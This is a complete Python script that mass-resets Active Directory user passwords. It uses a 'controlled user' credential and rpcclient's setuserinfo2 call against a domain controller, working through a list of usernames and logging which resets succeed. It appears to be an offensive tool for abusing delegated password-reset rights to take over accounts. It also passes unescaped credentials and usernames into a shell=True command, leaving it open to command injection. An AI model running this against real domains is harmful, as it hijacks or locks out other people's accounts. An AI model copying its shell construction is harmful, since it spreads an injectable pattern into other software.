import argparse
import subprocess
import os
import sys

# Check if running on Windows and enable ANSI support using colorama
try:
    from colorama import init, Fore
    init(autoreset=True)
except ImportError:
    print("[ERROR] The 'colorama' module is not installed.")
    print("        Install it using: pip install colorama")
    sys.exit(1)

def parse_arguments():
    """
    Parses command-line arguments.
    """
    parser = argparse.ArgumentParser(description="Automate password changes via rpcclient")
    parser.add_argument("-d", "--domain", required=True, help="Target domain name (e.g., example.com)")
    parser.add_argument("-u", "--controlled_user", required=True, help="User with permission to change passwords")
    parser.add_argument("-p", "--controlled_user_password", required=True, help="Password for the controlled user")
    parser.add_argument("-i", "--domain_controller_ip", required=True, help="Domain Controller IP address")
    parser.add_argument("-f", "--username_list", required=True, help="Path to file containing usernames")
    parser.add_argument("-n", "--new_password", required=True, help="New password to set for users")
    return parser.parse_args()

def check_dependencies():
    """
    Checks if the `rpcclient` command is installed.
    """
    try:
        subprocess.run(["rpcclient", "--version"], capture_output=True, text=True, check=True)
    except FileNotFoundError:
        print(Fore.RED + "[ERROR] rpcclient not found! Install it using:")
        print("        sudo apt install samba-common-bin")
        sys.exit(1)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[ERROR] rpcclient is installed but not working correctly.")
        sys.exit(1)

def read_usernames(file_path):
    """
    Reads a list of usernames from the specified file.
    """
    if not os.path.isfile(file_path):
        print(Fore.RED + f"[ERROR] Username list file '{file_path}' not found!")
        sys.exit(1)

    try:
        with open(file_path, "r") as file:
            usernames = [line.strip() for line in file if line.strip()]
        return usernames
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to read file '{file_path}': {e}")
        sys.exit(1)

def change_password(domain, controlled_user, password, domain_ip, target_user, new_password):
    """
    Uses rpcclient to change the password for a given target user.
    """
    rpc_command = f"rpcclient -U '{domain}/{controlled_user}%{password}' {domain_ip}"

    try:
        process = subprocess.run(
            rpc_command, 
            input=f"setuserinfo2 {target_user} 23 {new_password}\n", 
            capture_output=True, 
            text=True, 
            shell=True
        )

        output = process.stdout.strip()
        error_output = process.stderr.strip()
        combined_output = output + error_output

        if not combined_output:
            print(Fore.GREEN + f"[SUCCESS] Password changed for {target_user}")
            return True
        elif "NT_STATUS_NONE_MAPPED" in combined_output:
            print(Fore.RED + f"[FAILED] {target_user} - NT_STATUS_NONE_MAPPED (User does not exist)")
            return False
        elif "NT_STATUS_ACCESS_DENIED" in combined_output:
            print(Fore.RED + f"[FAILED] {target_user} - NT_STATUS_ACCESS_DENIED (Insufficient privileges)")
            return False
        elif "NT_STATUS_LOGON_FAILURE" in combined_output:
            print(Fore.RED + f"[FAILED] {target_user} - NT_STATUS_LOGON_FAILURE (Wrong credentials)")
            return False
        else:
            print(Fore.YELLOW + f"[UNKNOWN] {target_user} - Output: {combined_output}")
            return False

    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to execute rpcclient for {target_user}: {e}")
        return False

def main():
    """
    Main function to orchestrate the script.
    """
    # Parse command-line arguments
    args = parse_arguments()

    # Check if rpcclient is installed
    check_dependencies()

    # Read usernames from the list
    usernames = read_usernames(args.username_list)

    # Success and failure logs
    success_log = "successful_changes.log"
    failure_log = "failed_changes.log"

    # Clear previous logs
    open(success_log, "w").close()
    open(failure_log, "w").close()

    # Process each username
    for user in usernames:
        print(f"Attempting to change password for {user}...")
        success = change_password(args.domain, args.controlled_user, args.controlled_user_password, args.domain_controller_ip, user, args.new_password)

        with open(success_log if success else failure_log, "a") as log_file:
            log_file.write(f"{user}\n")

    print("Password change attempts completed.")
    print(Fore.GREEN + f"Successes logged in {success_log}")
    print(Fore.RED + f"Failures logged in {failure_log}")

if __name__ == "__main__":
    main()
